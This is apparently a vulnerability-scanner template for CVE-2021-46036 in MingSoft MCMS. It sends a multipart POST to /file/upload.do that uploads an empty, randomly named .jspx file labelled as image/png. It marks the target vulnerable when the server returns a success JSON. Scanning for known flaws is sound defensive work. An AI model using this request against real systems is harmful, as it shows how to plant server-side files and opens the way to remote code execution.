id:
name: CVE-2021-46036
tags:
  - MingSoft-Mcms
transport: http
set:
  randPath: randomLowercase(6)
rules:
  req:
    request:
      cache: false
      method: POST
      path: /file/upload.do
      headers:
        Upgrade-Insecure-Requests: 1
        Content-Type: multipart/form-data;boundary=---------------------------124088951720288539841514905041
        Content-Length: 571
        Connection: keep-alive
      body: |
        -----------------------------124088951720288539841514905041
        Content-Disposition: form-data; name="uploadPath"

        /
        -----------------------------124088951720288539841514905041
        Content-Disposition: form-data; name="isRename"

        false
        -----------------------------124088951720288539841514905041
        Content-Disposition: form-data; name="appId"

        false
        -----------------------------124088951720288539841514905041
        Content-Disposition: form-data; name="file"; filename="{{randPath}}.jspx"
        Content-Type: image/png

        -----------------------------124088951720288539841514905041--

    expression: response.status==200 &&
      response.content_type.icontains("application/json") &&
      response.body.bcontains(b'"result":true,') &&
      response.body.bcontains(b'"code":200,') &&
      response.body.bcontains(b'"data":')

expression: req()
detail:
  vulnerability:
    proof:
      info: "存在 CVE-2021-46036 文件上传漏洞"